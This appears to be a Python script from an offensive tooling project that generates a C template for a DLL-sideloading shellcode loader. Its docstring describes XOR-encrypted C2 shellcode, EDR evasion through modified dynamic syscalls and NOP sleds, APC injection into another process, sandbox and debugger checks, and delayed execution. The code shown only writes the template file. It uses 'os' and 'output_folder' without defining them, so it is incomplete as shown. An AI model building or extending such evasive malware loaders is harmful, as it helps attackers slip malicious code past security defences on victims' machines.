#!/usr/bin/python3

"""
This script encrypts the raw shellcode of any C2 using XOR encryption and outputs a C code template
for DLL sideloading with the encrypted shellcode and a randomly generated 4-byte key.
Also we will use Dynamic Syscalls from syswispers 2 the assembly is modified to evade the pattern that the EDR search 
Random nop sleds are added and also registers are moved.
APC injection is also used to inject the shellcode in another process
Also Sandobox Evasion mechanisms are used Harddisk check & if the process is being debugged.
Finally Timing attack is placed in the loader which using waitable timers to delay the execution of the shellcode. 
Test fails if any of the calls return an error state.
"""

import sys
sys.path.append('./Templates')
sys.path.append('./Constants')
import Banner
from C_Template import *

   



# Create the output folder if it doesn't exist
if not os.path.exists(output_folder):
    os.makedirs(output_folder)

# Generate output file path
output_filename = os.path.join(output_folder, "main.c")

# Write encoded shellcode to output file
with open(output_filename, "w") as f:
    f.write(c_template)
print("Create a new visual studio project and copy the files located at " + output_folder + " Folder \n")
print("DLL SIDELOADING Template has been saved to: " + output_filename)



